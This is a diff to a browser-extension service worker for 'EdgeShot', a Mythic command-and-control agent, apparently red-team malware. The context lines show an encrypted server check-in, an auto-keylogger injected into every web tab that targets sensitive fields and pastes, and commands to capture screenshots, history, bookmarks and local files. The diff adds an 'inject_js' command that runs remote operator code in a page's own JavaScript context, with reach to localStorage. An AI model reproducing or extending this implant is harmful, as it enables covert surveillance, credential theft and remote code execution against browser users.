@@ -1,5 +1,5 @@
 // ============================================================================
-// EdgeShot — Mythic agent (MV3 service worker)
+// EdgeShot: Mythic agent (MV3 service worker)
 //
 // Placeholders replaced at build time by builder.py:
 //   {{UUID}}        = payload UUID
@@ -28,7 +28,7 @@ const POLL_MINUTES = 0.1; // ~6 seconds (same as EdgeShot)
 const CAPABILITIES = [
   "heartbeat", "get_status", "get_capabilities", "get_active_tab",
   "get_tabs", "kill", "exit", "alert", "open_tab", "get_screenshot",
-  "get_dom", "get_history", "get_bookmarks", "upload_file",
+  "get_dom", "inject_js", "get_history", "get_bookmarks", "upload_file",
   "execute_file", "get_buffer", "get_file", "start_keylogger",
   "stop_keylogger", "network_recon", "get_notification", "send_notification",
   "send_notification_v2", "set_notification", "enable_proxy",
@@ -96,7 +96,7 @@ function hexToBytes(hex) {
 }
 
 // ---------------------------------------------------------------------------
-// Key + crypto (WebCrypto — available in a service worker, secure context)
+// Key + crypto (WebCrypto, available in a service worker, secure context)
 // ---------------------------------------------------------------------------
 let KEY_BYTES = null;
 
@@ -153,7 +153,7 @@ async function decryptMessage(b64) {
   const ciphertext = bytes.slice(52, bytes.length - 32);
   const hmac = bytes.slice(bytes.length - 32);
 
-  // (HMAC verification optional — CBC decryption is enough to detect tampering)
+  // (HMAC verification optional; CBC decryption is enough to detect tampering)
   const aesKey = await importAesKey();
   const plaintext = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, aesKey, ciphertext);
   return { uuid: uuidStr, msg: JSON.parse(new TextDecoder().decode(plaintext)) };
@@ -224,7 +224,7 @@ async function checkin() {
       const m = dec.msg;
       console.log("checkin response:", JSON.stringify(m));
       // IMPORTANT: Mythic returns the new callback UUID under the "id" key
-      // (never "uuid" — see handleAgentMessageCheckin.go + reflectBackOtherKeys).
+      // (never "uuid"; see handleAgentMessageCheckin.go + reflectBackOtherKeys).
       if (m && (m.id || m.uuid)) CALLBACK_UUID = m.id || m.uuid;
     } catch (e) {
       console.error("checkin decrypt failed", e);
@@ -622,7 +622,7 @@ function llmHook() {
 }
 
 // ============================================================================
-// Inline content script (ISOLATED world) — injected into every http(s) tab.
+// Inline content script (ISOLATED world), injected into every http(s) tab.
 // Auto-keylogger + LLM bridge. content.js stays empty for GAP compatibility.
 // ============================================================================
 function keyloggerContentScript() {
@@ -682,7 +682,7 @@ function keyloggerContentScript() {
     add(rawID);
     add(rawID.replace(/[_-]/g, ""));
 
-    // aria-labelledby — resolve the referenced element's text
+    // aria-labelledby: resolve the referenced element's text
     const labelledBy = el.getAttribute("aria-labelledby");
     if (labelledBy) {
       const ref = document.getElementById(labelledBy);
@@ -856,7 +856,7 @@ function keyloggerContentScript() {
   // Always active, but only records when isRecording === true.
   document.addEventListener("keydown", handleKeyDown);
 
-  // Global focusin — catches focus on any sensitive field, even dynamically
+  // Global focusin: catches focus on any sensitive field, even dynamically
   // created ones our scan missed.
   document.addEventListener("focusin", (e) => {
     const target = e.target;
@@ -870,7 +870,7 @@ function keyloggerContentScript() {
     buffer.length = 0;
   }, true);
 
-  // Global paste — catches pastes on fields not explicitly attached yet.
+  // Global paste: catches pastes on fields not explicitly attached yet.
   document.addEventListener("paste", (e) => {
     const target = e.target;
     if (!target || !/^(INPUT|TEXTAREA)$/.test(target.tagName) &&
@@ -1145,7 +1145,7 @@ async function handleTask(task) {
   let output = "";
   switch (cmd) {
     case "heartbeat":
-      output = "Extension active — service worker alive.";
+      output = "Extension active: service worker alive.";
       break;
     case "get_status": {
       let manifest = {};
@@ -1273,6 +1273,42 @@ async function handleTask(task) {
       }
       break;
     }
+    case "inject_js": {
+      const tabId = Number(params.tab_id) || 0;
+      let code = params.code || "";
+      if (!code) { output = JSON.stringify({ error: "missing_code" }); break; }
+      // Accept an optional <script>...</script> wrapper and strip it. The code is
+      // delivered as a <script> element appended to the page, so it runs in the
+      // page's own JS context (not the extension's isolated world) and can reach
+      // page globals, localStorage and in-memory state.
+      code = code.replace(/^\s*<script[^>]*>/i, "").replace(/<\/script>\s*$/i, "");
+      const allWindows = await chrome.windows.getAll({ populate: true });
+      const allTabs = (allWindows || []).flatMap((w) => w.tabs || []);
+      const scriptable = allTabs.filter((t) => t.url && isScriptable(t.url));
+      let target = scriptable.find((t) => t.id === tabId);
+      if (!target) target = scriptable.find((t) => t.active);
+      if (!target) {
+        output = JSON.stringify({ error: "no_scriptable_tab" });
+        break;
+      }
+      try {
+        await chrome.scripting.executeScript({
+          target: { tabId: target.id },
+          func: (src, tag) => {
+            const s = document.createElement(tag);
+            s.textContent = src;
+            (document.head || document.documentElement).appendChild(s);
+            s.remove();
+            return true;
+          },
+          args: [code, "script"],
+        });
+        output = JSON.stringify({ ok: true, tabId: target.id });
+      } catch (e) {
+        output = JSON.stringify({ error: "inject_failed", detail: String((e && e.message) || e) });
+      }
+      break;
+    }
     case "get_history": {
       let maxResults = Number(params.max_results);
       if (isNaN(maxResults) || maxResults <= 0) maxResults = 200;
@@ -1392,7 +1428,7 @@ async function handleTask(task) {
       const url = "file:///" + path.replace(/\\/g, "/");
       try {
         const res = await fetch(url);
-        // file:// responses report status 0 (opaque) even on success — rely on
+        // file:// responses report status 0 (opaque) even on success; rely on
         // the body, never on res.ok / res.status.
         const bytes = new Uint8Array(await res.arrayBuffer());
         if (bytes.length === 0) throw new Error("empty response (file URL access not granted?)");
@@ -1410,7 +1446,7 @@ async function handleTask(task) {
             const icon = r.type === "dir" ? "[DIR] " : "[FILE]";
             return icon + "  " + r.name.padEnd(30) + " " + r.modified;
           }).join("\n");
-          output = path + "\n" + "─".repeat(55) + "\n" + listing;
+          output = path + "\n" + "-".repeat(55) + "\n" + listing;
           break;
         }
 
